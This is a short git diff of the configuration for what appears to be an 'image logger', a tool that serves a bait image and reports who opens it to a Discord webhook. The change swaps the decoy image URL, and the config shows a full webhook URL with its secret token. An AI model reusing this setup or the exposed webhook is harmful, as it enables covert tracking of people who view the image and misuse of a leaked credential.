@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1109544641629520014/sbIch0DGA35aNFQp4auzTwZUs1aqx8O1ch0fvimnbUDEB_D63CrAU8QKnbWfkBeoRdPZ",
-    "image": "https://www.google.cz/url?sa=i&url=http%3A%2F%2Fwww.smartredirect.de%2Fredir%2FclickGate.php%3Fu%3DIgKHHLBT%26m%3D1%26p%3DbvjHgP4nHn%26t%3DxZJdYif2%26st%3D%26s%3D%26splash%3D0%26abp%3D1%26url%3Dhttps%253A%252F%252Fstock.adobe.com%252Fcz%252Fsearch%253Fk%253D%252522i%252520like%252520you%252522%26r%3Dhttps%253A%252F%252Fwww.google.cz%252Fsearch%253Fq%253Di%252Blike%252Byou%2526tbm%253Disch%2526sxsrf%253DAPwXEdeUzKbvw2Q3StJvlW5nQMWRm1pCig%253A1684606496585%2526source%253Dlnms%2526sa%253DX%2526ved%253D2ahUKEwiqpcKewIT_AhUz_7sIHe6RC98Q_AUoAnoECAoQBA%2526biw%253D874%2526bih%253D951%2526dpr%253D1%2523imgrc%253DIcMDfsgyp31M8M&psig=AOvVaw3hvtsbl6IGYQqATFE3e02Q&ust=1684692897847000&source=images&cd=vfe&ved=0CBEQjRxqFwoTCIjH7Z7AhP8CFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://as2.ftcdn.net/v2/jpg/00/60/40/01/1000_F_60400194_lS1hnqXYnUHcvFheoWHu1bI6TaUZw97Y.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
